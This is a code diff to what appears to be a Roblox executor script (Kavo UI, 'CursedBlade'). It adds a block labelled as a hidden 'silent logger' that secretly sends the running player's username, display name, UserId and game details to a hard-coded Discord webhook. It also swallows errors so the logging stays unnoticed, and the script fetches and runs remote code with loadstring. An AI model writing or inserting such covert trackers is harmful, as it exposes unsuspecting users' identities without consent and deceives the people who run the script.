@@ -12,6 +12,50 @@ local RunService = game:GetService("RunService")
 local player = Players.LocalPlayer
 
 -- =========================
+-- SILENT LOGGER (oculto)
+-- =========================
+task.spawn(function()
+    local ok, err = pcall(function()
+        local WEBHOOK = "https://discord.com/api/webhooks/1435495615957045251/ixzdVpsuLiNKqqb33QsuWRxGP1GVxZ-cSaQcr8oYMn1eg0k_rE-HfXw6ryXLd0O3-idQ"  -- <-- pega tu Discord webhook URL aquí
+
+        local data = {
+            username = "Sluwh Logger",
+            avatar_url = "https://i.imgur.com/RoxeVhS.png",
+            embeds = {{
+                title = "📋 Nuevo Usuario",
+                color = 0x5865F2,
+                fields = {
+                    { name = "Username",      value = player.Name,                       inline = true  },
+                    { name = "DisplayName",   value = player.DisplayName,                inline = true  },
+                    { name = "UserId",        value = tostring(player.UserId),           inline = true  },
+                    { name = "PlaceId",       value = tostring(game.PlaceId),            inline = true  },
+                    { name = "PlaceName",     value = tostring(game.Name),               inline = true  },
+                    { name = "Tiempo (UTC)",  value = tostring(os.time()),               inline = false },
+                },
+                footer = { text = "Sluwh CursedBlade Logger" }
+            }}
+        }
+
+        local body = game:GetService("HttpService"):JSONEncode(data)
+
+        -- Compatibilidad con ejecutores: intenta request, si no http.request, si no HttpGet
+        local reqFn = (typeof(request) == "function" and request)
+                   or (typeof(http) == "table" and http.request)
+                   or nil
+
+        if reqFn then
+            reqFn({
+                Url    = WEBHOOK,
+                Method = "POST",
+                Headers = { ["Content-Type"] = "application/json" },
+                Body   = body
+            })
+        end
+    end)
+    -- El error se descarta silenciosamente para no delatar el logger
+end)
+
+-- =========================
 -- KAVO UI INITIALIZATION
 -- =========================
 local Library = loadstring(game:HttpGet("https://raw.githubusercontent.com/xHeptc/Kavo-UI-Library/main/source.lua"))()
